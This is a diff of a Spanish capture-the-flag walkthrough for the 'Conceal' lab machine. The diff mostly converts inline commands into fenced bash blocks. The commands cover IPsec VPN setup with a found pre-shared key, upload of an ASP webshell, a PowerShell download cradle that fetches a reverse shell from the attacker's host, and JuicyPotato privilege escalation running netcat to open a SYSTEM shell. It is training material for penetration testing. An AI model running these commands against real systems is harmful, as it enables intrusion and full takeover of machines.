@@ -84,9 +84,25 @@ si existe un ike scan en github y lo encontramos. Intentando saver si viene de f
 ike-scan 10.10.10.116
 ```
 
-nos pone un mensaje de error y si le hacemos un `strace ike-scan 10.10.10.116` vemos que el error viene de nuestra maquina.
-Si le hacemos un `lsof -i:500` vemos que effectivamente nuestra maquina de atacante ya esta usando el puerto 500 que se llama charon.
-le hacemos un `pkill charon` y volmemos a hacerle un `ike-scan 10.10.10.116` ya vemos cosas pero de forma turbia.
+nos pone un mensaje de error y si le hacemos un 
+```bash
+ strace ike-scan 10.10.10.116 
+```
+ vemos que el error viene de nuestra maquina.
+Si le hacemos un 
+```bash
+ lsof -i:500 
+```
+ vemos que effectivamente nuestra maquina de atacante ya esta usando el puerto 500 que se llama charon.
+le hacemos un 
+```bash
+ pkill charon 
+```
+ y volmemos a hacerle un 
+```bash
+ ike-scan 10.10.10.116 
+```
+ ya vemos cosas pero de forma turbia.
 
 ```bash
 pkill charon
@@ -101,8 +117,16 @@ Aqui ya vemos todas las informaciones necessarias para podernos crear unos fiche
 
 Los dos ficheros que tenemos que tocar para configurar la VPN son:
 
-- el fichero `/etc/ipsec.secrets` para la authentificacion
-- el fichero `/etc/ipsec.conf` para la configuracion
+- el fichero 
+```bash
+ /etc/ipsec.secrets 
+```
+ para la authentificacion
+- el fichero 
+```bash
+ /etc/ipsec.conf 
+```
+ para la configuracion
 
 Si buscamos por internet como se configura el fichero ipsec.secrets y encontramos algo el la web [systutorials](https://www.systutorials.com/docs/linux/man/5-ipsec.secrets)
 
@@ -114,7 +138,11 @@ Si buscamos por internet como se configura el fichero ipsec.secrets y encontramo
 %any : PSK "Dudecake1!"
 ```
 
-y en el fichero de configuracion `/etc/ipsec.conf`
+y en el fichero de configuracion 
+```bash
+ /etc/ipsec.conf 
+```
+
 
 ```bash
 conn conceal
@@ -161,7 +189,11 @@ connection 'conceal' established successfully
 ### Enumeracion con nmap por sondeo TCP connect {-}
 
 Como ya estamos connectados, vamos a poder rescannear la maquina con nmap. El problema es que como estamos por VPN.
-el paramettro `-sS` no va a funccionar. Tenemos que pasar por un sondeo TCP connect
+el paramettro 
+```bash
+ -sS 
+```
+ no va a funccionar. Tenemos que pasar por un sondeo TCP connect
 
 ```bash
 nmap -sT --min-rate 5000 --open -vvv -n -Pn -p- 10.10.10.116 -oG allPorts
@@ -207,7 +239,11 @@ Fuzzeamos el puerto 80
 wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.116/FUZZ
 ```
 
-Encontramos un routa `/upload`
+Encontramos un routa 
+```bash
+ /upload 
+```
+
 
 Si miramos con firefox vemos que tenemos capacidad de directory listing pero no hay nada. Intentamos subir cosas por ftp 
 a ver si se nos lista aqui.
@@ -221,13 +257,21 @@ dir
 ls -la
 ```
 
-En otro terminal creamos un fichero de prueba `echo "EEEEE" > prueba.txt` y lo subimos por ftp.
+En otro terminal creamos un fichero de prueba 
+```bash
+ echo "EEEEE" > prueba.txt 
+```
+ y lo subimos por ftp.
 
 ```bash
 put prueba.txt
 ```
 
-Si miramos en la web en la direccion `/upload` podemos ver el fichero prueba.txt.
+Si miramos en la web en la direccion 
+```bash
+ /upload 
+```
+ podemos ver el fichero prueba.txt.
 
 
 ## Vulnerability Assessment {-}
@@ -241,13 +285,21 @@ dir
 ls -la
 ```
 
-En otro terminal creamos un fichero de prueba `echo "EEEEE" > prueba.txt` y lo subimos por ftp.
+En otro terminal creamos un fichero de prueba 
+```bash
+ echo "EEEEE" > prueba.txt 
+```
+ y lo subimos por ftp.
 
 ```bash
 put prueba.txt
 ```
 
-Si miramos en la web en la direccion `/upload` podemos ver el fichero prueba.txt.
+Si miramos en la web en la direccion 
+```bash
+ /upload 
+```
+ podemos ver el fichero prueba.txt.
 
 ### Remote Code execution con fichero asp {-}
 
@@ -266,7 +318,11 @@ lo subimos con ftp
 put s4vishell.asp
 ```
 
-y si miramos por la web `http://10.10.10.116/upload/s4vishell.asp?cmd=whoami` y ya tenemos capacidad de remote code execution.
+y si miramos por la web 
+```bash
+ http://10.10.10.116/upload/s4vishell.asp?cmd=whoami 
+```
+ y ya tenemos capacidad de remote code execution.
 
 ## Vuln exploit & Gaining Access {-}
 
@@ -282,7 +338,11 @@ cp Invoke-PowerShellTcp.ps1 PS.ps1
 vi PS.ps1
 ```
 
-Como siempre le añadimos `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.8 -Port 443` al final del fichero.
+Como siempre le añadimos 
+```bash
+ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.8 -Port 443 
+```
+ al final del fichero.
 
 Nos compartimos un servidor http con python
 
@@ -296,12 +356,28 @@ Nos ponemos en escucha por el puerto 443
 rlwrap nc -nlvp 443
 ```
 
-Y por la webshell nos descargamos el fichero PS.ps1 `http://10.10.10.116/upload/s4vishell.asp?cmd=powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/PS.ps1')`
+Y por la webshell nos descargamos el fichero PS.ps1 
+```bash
+ http://10.10.10.116/upload/s4vishell.asp?cmd=powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/PS.ps1') 
+```
+
 
 Ya podemos comprobar que estamos a dentro de la maquina y que podemos ver la flag.
 
-> Note: Si le hacemos un `[Environment]::Is64BitOperatingSystem` y un `[Environment]::Is64BitProcess`, podemos ver que el process nos da False. Aqui es recommendado siempre tirar
-de la powershell nativa que seria  `http://10.10.10.116/upload/s4vishell.asp?cmd=C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/PS.ps1')`
+> Note: Si le hacemos un 
+```bash
+ [Environment]::Is64BitOperatingSystem 
+```
+ y un 
+```bash
+ [Environment]::Is64BitProcess 
+```
+, podemos ver que el process nos da False. Aqui es recommendado siempre tirar
+de la powershell nativa que seria  
+```bash
+ http://10.10.10.116/upload/s4vishell.asp?cmd=C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/PS.ps1') 
+```
+
 ## Privilege Escalation {-}
 
 ### Rootear la maquina {-}
@@ -346,10 +422,18 @@ Nos connectamos con el servicio nc con el JuicyPotato.
 
 Aqui nos sale une error 10038. Esto suele passar cuando el CLSID no es el correcto. Como savemos con el systeminfo
 que estamos en una maquina Windows10 Enterprise, podemos buscar el CLSID correcto en [Interesting CLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)
-encontramos el CLSID que corresponde y con el parametro `-c`
+encontramos el CLSID que corresponde y con el parametro 
+```bash
+ -c 
+```
+
 
 ```bash
 ./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd 10.10.14.8 443" -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"
 ```
 
-La reverse shell nos a functionnado y con `whoami` vemos que ya somos nt authority\system y podemos ver la flag.
+La reverse shell nos a functionnado y con 
+```bash
+ whoami 
+```
+ vemos que ya somos nt authority\system y podemos ver la flag.
